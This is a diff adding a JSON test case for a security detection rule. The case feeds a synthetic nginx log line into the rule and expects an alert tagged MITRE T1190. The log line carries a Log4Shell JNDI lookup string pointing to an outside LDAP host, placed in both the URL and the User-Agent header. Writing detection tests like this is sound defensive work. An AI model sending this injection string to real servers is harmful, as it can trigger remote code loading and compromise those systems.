@@ -1,0 +1,29 @@
+{
+  "id": "web_log4shell_jndi",
+  "title": "Log4Shell JNDI lookup injection",
+  "description": "A ${jndi:ldap://...} lookup string in the URL and User-Agent (CVE-2021-44228 probing).",
+  "host": "lab-web-01",
+  "kind": "positive",
+  "events": [
+    {
+      "source": "nginx_access",
+      "template": "198.51.100.127 - - [@@nginx_ts@@] \"GET /?q=${jndi:ldap://203.0.113.9:1389/a} HTTP/1.1\" 200 612 \"-\" \"${jndi:ldap://203.0.113.9:1389/a}\""
+    }
+  ],
+  "identity": {
+    "data.srcip": "198.51.100.127"
+  },
+  "logtest": true,
+  "expect": [
+    {
+      "rule_id": "100173",
+      "level": 14,
+      "mitre": [
+        "T1190"
+      ],
+      "fields": {
+        "data.srcip": "198.51.100.127"
+      }
+    }
+  ]
+}
